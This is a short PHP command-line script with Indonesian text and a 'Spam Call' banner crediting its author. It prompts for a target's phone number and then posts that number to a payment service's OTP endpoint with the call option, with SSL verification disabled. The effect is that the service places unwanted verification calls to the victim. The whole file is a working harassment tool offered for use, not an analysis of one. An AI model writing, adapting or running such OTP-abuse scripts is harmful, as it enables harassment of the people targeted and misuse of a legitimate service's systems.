<?php
// Limit 3x Telpon Setiap Satu Nomor
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
        curl_close($ch);
                echo $asw."\n";
}
$red    = "\e[91m";
echo $red."
╔═╗┌─┐┌─┐┌┬┐  ╔═╗┌─┐┬  ┬  
╚═╗├─┘├─┤│││  ║  ├─┤│  │  
╚═╝┴  ┴ ┴┴ ┴  ╚═╝┴ ┴┴─┘┴─┘\n\n".$red.
"Lolos ITB 2020/ Rizki\n";
echo $white."
[!] Author   : Muhammad Rizki/Ryus4n	[!]
[!] Telegram  : t.me/cy6ny/Rizki   [!]
[!] github   : github.com/zenkriztao       [!]\n\n";
echo $red."
======================================
|[!]  SMANPOEL/Teknik Informatika ITB/MIT x86_x64 lu=inux inside team [!]|
======================================\n\n";
echo "\n\n";
echo "\n\n";
echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n";
echo "@ [!]  Contoh : 0852***** / 62852******  [!] @\n";
echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n";
echo " \n";
echo " \n";
sleep ('0.4');
echo "x86_x64 linux@ Masukan No Hp Target #-> ";
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
print $execute;
?>
